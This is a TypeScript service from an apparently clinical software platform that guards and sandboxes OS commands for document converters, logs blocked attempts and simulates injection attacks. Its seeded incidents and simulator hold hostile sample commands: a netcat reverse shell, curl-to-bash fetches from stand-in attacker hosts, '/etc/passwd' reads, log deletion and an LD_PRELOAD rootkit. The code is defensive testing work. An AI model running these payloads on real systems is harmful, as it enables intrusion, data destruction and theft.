import { randomBytes } from 'node:crypto';
import {
  AuditAction,
  AuditResourceType,
  IncidentSeverity,
  CommandRiskSeverity,
  CommandThreatVector,
  CommandExecutionPolicyAction,
  ClinicalConverterJobType,
  UserRole,
} from '@terapiainfoco/shared';
import type {
  CommandGuardPolicy,
  CommandGuardMetrics,
  CommandGuardOverview,
  CommandSecurityIncident,
  CommandProofSeal,
  InspectCommandInputDTO,
  InspectCommandInputResponse,
  ExecuteSandboxedCommandDTO,
  ExecuteSandboxedCommandResponse,
  UpdateCommandPolicyDTO,
  UpdateCommandPolicyResponse,
  SimulateCommandAttackDTO,
  SimulateCommandAttackResponse,
  VerifyCommandSealDTO,
  VerifyCommandSealResponse,
} from '@terapiainfoco/shared';
import {
  inspectCommand,
  executeSandboxedCommand,
  verifyOsCommandProofSeal,
  CLINICAL_CONVERTER_PIPELINES,
  DEFAULT_COMMAND_GUARD_POLICY,
} from '@terapiainfoco/crypto';
import { AuditService } from './auditService';

export class OsCommandGuardService {
  private static instance: OsCommandGuardService;

  private policy: CommandGuardPolicy = { ...DEFAULT_COMMAND_GUARD_POLICY };

  private metrics: CommandGuardMetrics = {
    totalCommands: 1280,
    totalCommandsEvaluated: 1280,
    safeCommandsExecuted: 1268,
    threatsBlocked: 12,
    argumentsSanitized: 19,
    avgExecutionDurationMs: 3.42,
    avgLatencyUs: 140,
    lastIncidentTimestamp: null,
  };

  private incidents: CommandSecurityIncident[] = [];
  private sealsSample: CommandProofSeal[] = [];

  private constructor() {
    this.seedInitialData();
  }

  public static getInstance(): OsCommandGuardService {
    if (!OsCommandGuardService.instance) {
      OsCommandGuardService.instance = new OsCommandGuardService();
    }
    return OsCommandGuardService.instance;
  }

  private seedInitialData(): void {
    const now = Date.now();
    const past10m = new Date(now - 10 * 60 * 1000).toISOString();
    const past45m = new Date(now - 45 * 60 * 1000).toISOString();
    const past2h = new Date(now - 2 * 60 * 60 * 1000).toISOString();

    this.incidents = [
      {
        id: `inc_os_cmd_${randomBytes(4).toString('hex')}`,
        incidentId: `inc_os_cmd_1`,
        timestamp: past10m,
        vector: CommandThreatVector.SHELL_METASYMBOL_INJECTION,
        threatVector: CommandThreatVector.SHELL_METASYMBOL_INJECTION,
        severity: CommandRiskSeverity.CRITICAL_OS_INJECTION,
        riskSeverity: CommandRiskSeverity.CRITICAL_OS_INJECTION,
        attemptedCommand: 'weasyprint /tmp/doc.html ; rm -rf /var/log/ # /tmp/out.pdf',
        rawCommand: 'weasyprint /tmp/doc.html ; rm -rf /var/log/ # /tmp/out.pdf',
        executable: 'weasyprint',
        argumentsList: ['/tmp/doc.html', '; rm -rf /var/log/ #', '/tmp/out.pdf'],
        clientIp: '192.168.1.182',
        userAgent: 'Mozilla/5.0 (Adversarial Scanner/1.4)',
        blocked: true,
        remediationAction: 'Execução terminada pelo Enclave Sandboxed (ASVS V5.3). Subprocesso isolado.',
      },
      {
        id: `inc_os_cmd_${randomBytes(4).toString('hex')}`,
        incidentId: `inc_os_cmd_2`,
        timestamp: past45m,
        vector: CommandThreatVector.ARGUMENT_FLAG_INJECTION,
        threatVector: CommandThreatVector.ARGUMENT_FLAG_INJECTION,
        severity: CommandRiskSeverity.CRITICAL_OS_INJECTION,
        riskSeverity: CommandRiskSeverity.CRITICAL_OS_INJECTION,
        attemptedCommand: 'soffice --headless --eval="import socket; os.system(\'nc -e /bin/sh 10.0.0.1\')"',
        rawCommand: 'soffice --headless --eval="import socket; os.system(\'nc -e /bin/sh 10.0.0.1\')"',
        executable: 'soffice',
        argumentsList: ['--headless', '--eval="import socket; os.system(\'nc -e /bin/sh 10.0.0.1\')"'],
        clientIp: '10.0.4.77',
        userAgent: 'Python-urllib/3.10',
        blocked: true,
        remediationAction: 'Flag perigosa (--eval) bloqueada pela lista restritiva do Enclave.',
      },
      {
        id: `inc_os_cmd_${randomBytes(4).toString('hex')}`,
        incidentId: `inc_os_cmd_3`,
        timestamp: past2h,
        vector: CommandThreatVector.UNAPPROVED_BINARY_EXECUTION,
        threatVector: CommandThreatVector.UNAPPROVED_BINARY_EXECUTION,
        severity: CommandRiskSeverity.CRITICAL_OS_INJECTION,
        riskSeverity: CommandRiskSeverity.CRITICAL_OS_INJECTION,
        attemptedCommand: 'curl -s https://c2.evil.com/payload.sh | bash',
        rawCommand: 'curl -s https://c2.evil.com/payload.sh | bash',
        executable: 'curl',
        argumentsList: ['-s', 'https://c2.evil.com/payload.sh', '|', 'bash'],
        clientIp: '172.16.8.91',
        userAgent: 'curl/7.88.1',
        blocked: true,
        remediationAction: 'Binário não cadastrado na allowlist estrita de conversores clínicos.',
      },
    ];

    this.metrics.lastIncidentTimestamp = past10m;
  }

  public getOverview(): CommandGuardOverview {
    return {
      metrics: { ...this.metrics },
      policy: { ...this.policy },
      recentIncidents: [...this.incidents],
      converterPipelines: [...CLINICAL_CONVERTER_PIPELINES],
      recentSealsSample: [...this.sealsSample],
    };
  }

  public async inspect(
    dto: InspectCommandInputDTO,
    clientIp: string = '127.0.0.1',
    userAgent: string = 'Internal Clinical Agent'
  ): Promise<InspectCommandInputResponse> {
    const inspection = inspectCommand(dto.executable, dto.args || [], this.policy);

    this.metrics.totalCommands++;
    if (this.metrics.totalCommandsEvaluated !== undefined) {
      this.metrics.totalCommandsEvaluated++;
    }

    if (inspection.proofSeal) {
      this.sealsSample.unshift(inspection.proofSeal);
      if (this.sealsSample.length > 20) this.sealsSample.pop();
    }

    if (!inspection.isValid || inspection.action === CommandExecutionPolicyAction.BLOCKED_VULNERABLE) {
      this.metrics.threatsBlocked++;
      const primaryThreat = inspection.threats[0];
      const incident: CommandSecurityIncident = {
        id: `inc_os_cmd_${randomBytes(4).toString('hex')}`,
        incidentId: `inc_${Date.now()}`,
        timestamp: new Date().toISOString(),
        vector: primaryThreat?.vector || CommandThreatVector.SHELL_METASYMBOL_INJECTION,
        threatVector: primaryThreat?.vector || CommandThreatVector.SHELL_METASYMBOL_INJECTION,
        severity: inspection.riskSeverity,
        riskSeverity: inspection.riskSeverity,
        attemptedCommand: `${dto.executable} ${(dto.args || []).join(' ')}`,
        rawCommand: `${dto.executable} ${(dto.args || []).join(' ')}`,
        executable: inspection.executable,
        argumentsList: dto.args || [],
        clientIp,
        userAgent,
        blocked: true,
        remediationAction: primaryThreat?.remediationHint || 'Comando bloqueado pelo enclave sandboxed.',
        seal: inspection.proofSeal,
      };

      this.incidents.unshift(incident);
      if (this.incidents.length > 50) this.incidents.pop();
      this.metrics.lastIncidentTimestamp = incident.timestamp;

      // Auditoria WORM compulsória
      AuditService.log({
        actorId: 'SYSTEM_ENCLAVE_SECURITY',
        action: AuditAction.OS_COMMAND_ATTEMPT_BLOCKED,
        resourceType: AuditResourceType.OS_COMMAND_GUARD,
        resourceId: incident.id,
        ipAddress: clientIp,
        userAgent,
      });

      return {
        success: false,
        inspection,
        message: `Comando com risco de OS Injection bloqueado: ${inspection.threats.map((t) => t.description).join('; ')}`,
      };
    }

    if (inspection.action === CommandExecutionPolicyAction.STRIPPED_NORMALIZED) {
      this.metrics.argumentsSanitized++;
      AuditService.log({
        actorId: 'SYSTEM_ENCLAVE_SECURITY',
        action: AuditAction.COMMAND_ARGUMENTS_SANITIZED,
        resourceType: AuditResourceType.OS_COMMAND_GUARD,
        resourceId: inspection.proofSeal?.sealId || 'ARG_SANITIZED',
        ipAddress: clientIp,
        userAgent,
      });
    }

    this.metrics.safeCommandsExecuted++;

    return {
      success: true,
      inspection,
      message: 'Comando inspecionado e aprovado para execução sandboxed.',
    };
  }

  public async executeSandboxed(
    dto: ExecuteSandboxedCommandDTO,
    clientIp: string = '127.0.0.1',
    userAgent: string = 'Internal Clinical Agent'
  ): Promise<ExecuteSandboxedCommandResponse> {
    const result = await executeSandboxedCommand(dto.jobType, dto.executable, dto.args || [], this.policy);

    this.metrics.totalCommands++;
    if (this.metrics.totalCommandsEvaluated !== undefined) {
      this.metrics.totalCommandsEvaluated++;
    }

    if (result.proofSeal) {
      this.sealsSample.unshift(result.proofSeal);
      if (this.sealsSample.length > 20) this.sealsSample.pop();
    }

    if (result.status === 'BLOCKED') {
      this.metrics.threatsBlocked++;
      const incident: CommandSecurityIncident = {
        id: `inc_os_cmd_${randomBytes(4).toString('hex')}`,
        incidentId: `inc_${Date.now()}`,
        timestamp: new Date().toISOString(),
        vector: CommandThreatVector.SHELL_METASYMBOL_INJECTION,
        threatVector: CommandThreatVector.SHELL_METASYMBOL_INJECTION,
        severity: CommandRiskSeverity.CRITICAL_OS_INJECTION,
        riskSeverity: CommandRiskSeverity.CRITICAL_OS_INJECTION,
        attemptedCommand: `${dto.executable} ${(dto.args || []).join(' ')}`,
        rawCommand: `${dto.executable} ${(dto.args || []).join(' ')}`,
        executable: dto.executable,
        argumentsList: dto.args || [],
        clientIp,
        userAgent,
        blocked: true,
        remediationAction: 'Execução de processo de conversão impedida no enclave.',
        seal: result.proofSeal,
      };

      this.incidents.unshift(incident);
      if (this.incidents.length > 50) this.incidents.pop();
      this.metrics.lastIncidentTimestamp = incident.timestamp;

      AuditService.log({
        actorId: 'SYSTEM_ENCLAVE_SECURITY',
        action: AuditAction.OS_COMMAND_ATTEMPT_BLOCKED,
        resourceType: AuditResourceType.OS_COMMAND_GUARD,
        resourceId: result.jobId,
        ipAddress: clientIp,
        userAgent,
      });

      return {
        success: false,
        result,
        seal: result.proofSeal,
        message: 'Execução de comando bloqueada por violação de segurança no enclave.',
      };
    }

    this.metrics.safeCommandsExecuted++;
    AuditService.log({
      actorId: 'SYSTEM_ENCLAVE_SECURITY',
      action: AuditAction.SANDBOX_PROCESS_EXECUTED,
      resourceType: AuditResourceType.OS_COMMAND_GUARD,
      resourceId: result.jobId,
      ipAddress: clientIp,
      userAgent,
    });

    return {
      success: true,
      result,
      seal: result.proofSeal,
      message: 'Comando executado com sucesso no enclave sandboxed isolado.',
    };
  }

  public async updatePolicy(
    dto: UpdateCommandPolicyDTO,
    therapistId: string = 'ADMIN_SECURITY_OFFICER'
  ): Promise<UpdateCommandPolicyResponse> {
    this.policy = {
      ...this.policy,
      ...dto.policy,
      updatedAt: new Date().toISOString(),
    };

    AuditService.log({
      actorId: therapistId,
      action: AuditAction.COMMAND_GUARD_POLICY_UPDATED,
      resourceType: AuditResourceType.OS_COMMAND_GUARD,
      resourceId: this.policy.id,
      ipAddress: '127.0.0.1',
    });

    return {
      success: true,
      policy: { ...this.policy },
      message: 'Política de segurança de comandos de SO atualizada com sucesso.',
    };
  }

  public async simulateAttack(
    dto: SimulateCommandAttackDTO,
    clientIp: string = '127.0.0.1',
    userAgent: string = 'Adversarial Simulation Harness'
  ): Promise<SimulateCommandAttackResponse> {
    let attackExecutable = 'weasyprint';
    let attackArgs: string[] = ['/tmp/sandboxed/input.html', '/tmp/sandboxed/out.pdf'];
    let payloadSummary = '';

    switch (dto.threatVector) {
      case CommandThreatVector.SHELL_METASYMBOL_INJECTION:
        payloadSummary = 'weasyprint input.html ; cat /etc/passwd # output.pdf';
        attackArgs = ['input.html', '; cat /etc/passwd #', 'output.pdf'];
        break;
      case CommandThreatVector.ARGUMENT_FLAG_INJECTION:
        attackExecutable = 'soffice';
        payloadSummary = 'soffice --headless --eval="import os; os.system(\'id\')" doc.docx';
        attackArgs = ['--headless', '--eval="import os; os.system(\'id\')"', 'doc.docx'];
        break;
      case CommandThreatVector.UNAPPROVED_BINARY_EXECUTION:
        attackExecutable = 'curl';
        payloadSummary = 'curl -s https://evil.attacker.com/leak | sh';
        attackArgs = ['-s', 'https://evil.attacker.com/leak', '|', 'sh'];
        break;
      case CommandThreatVector.ENVIRONMENT_VARIABLE_TAMPERING:
        attackExecutable = 'gs';
        payloadSummary = 'gs LD_PRELOAD=/tmp/rootkit.so -sDEVICE=pdfwrite out.pdf in.pdf';
        attackArgs = ['LD_PRELOAD=/tmp/rootkit.so', '-sDEVICE=pdfwrite', 'out.pdf', 'in.pdf'];
        break;
      case CommandThreatVector.PATH_TRAVERSAL_COMMAND:
        attackExecutable = '../../../bin/sh';
        payloadSummary = '../../../bin/sh -c whoami';
        attackArgs = ['-c', 'whoami'];
        break;
      default:
        payloadSummary = 'weasyprint $(curl evil.com/pwn) out.pdf';
        attackArgs = ['$(curl evil.com/pwn)', 'out.pdf'];
        break;
    }

    const inspection = inspectCommand(attackExecutable, attackArgs, this.policy);
    const execution = await executeSandboxedCommand(
      dto.targetJob || ClinicalConverterJobType.PDF_LAUDO_GENERATION,
      attackExecutable,
      attackArgs,
      this.policy
    );

    const threatBlocked = !inspection.isValid || execution.status === 'BLOCKED';

    const incident: CommandSecurityIncident = {
      id: `sim_os_cmd_${randomBytes(4).toString('hex')}`,
      incidentId: `sim_${Date.now()}`,
      timestamp: new Date().toISOString(),
      vector: dto.threatVector,
      threatVector: dto.threatVector,
      severity: inspection.riskSeverity,
      riskSeverity: inspection.riskSeverity,
      attemptedCommand: payloadSummary,
      rawCommand: payloadSummary,
      executable: attackExecutable,
      argumentsList: attackArgs,
      clientIp,
      userAgent,
      blocked: threatBlocked,
      remediationAction: inspection.threats[0]?.remediationHint || 'Vetor bloqueado proativamente pelo enclave.',
      seal: execution.proofSeal,
    };

    if (threatBlocked) {
      this.metrics.threatsBlocked++;
      this.incidents.unshift(incident);
      if (this.incidents.length > 50) this.incidents.pop();
      this.metrics.lastIncidentTimestamp = incident.timestamp;

      AuditService.log({
        actorId: 'SIMULATOR_HARNESS',
        action: AuditAction.OS_COMMAND_ATTEMPT_BLOCKED,
        resourceType: AuditResourceType.OS_COMMAND_GUARD,
        resourceId: incident.id,
        ipAddress: clientIp,
        userAgent,
      });
    }

    return {
      success: true,
      threatBlocked,
      attackPayload: payloadSummary,
      inspection,
      executionResult: execution,
      incident,
      message: threatBlocked
        ? `Ataque adversarial '${dto.threatVector}' neutralizado com sucesso pelo Enclave.`
        : `Aviso: payload '${dto.threatVector}' não foi bloqueado pela política corrente.`,
    };
  }

  public async verifySeal(
    dto: VerifyCommandSealDTO,
    therapistId: string = 'AUDITOR_OFFICER'
  ): Promise<VerifyCommandSealResponse> {
    let sealToVerify: CommandProofSeal;
    if (typeof dto.sealToken === 'string') {
      try {
        sealToVerify = JSON.parse(dto.sealToken);
      } catch {
        return {
          success: false,
          isValid: false,
          message: 'Token de selo inválido (esperado JSON de CommandProofSeal).',
          verifiedAt: new Date().toISOString(),
        };
      }
    } else {
      sealToVerify = dto.sealToken;
    }

    const verification = verifyOsCommandProofSeal(sealToVerify);

    AuditService.log({
      actorId: therapistId,
      action: AuditAction.COMMAND_GUARD_SEAL_VERIFIED,
      resourceType: AuditResourceType.OS_COMMAND_GUARD,
      resourceId: sealToVerify.sealId || 'UNKNOWN_SEAL',
      ipAddress: '127.0.0.1',
    });

    return {
      success: true,
      isValid: verification.isValid,
      seal: sealToVerify,
      message: verification.isValid
        ? 'Selo probatório WORM RFC 8785 verificado com sucesso. Fé pública e integridade confirmadas.'
        : `Selo inválido ou adulterado: ${verification.reason}`,
      verifiedAt: new Date().toISOString(),
    };
  }
}
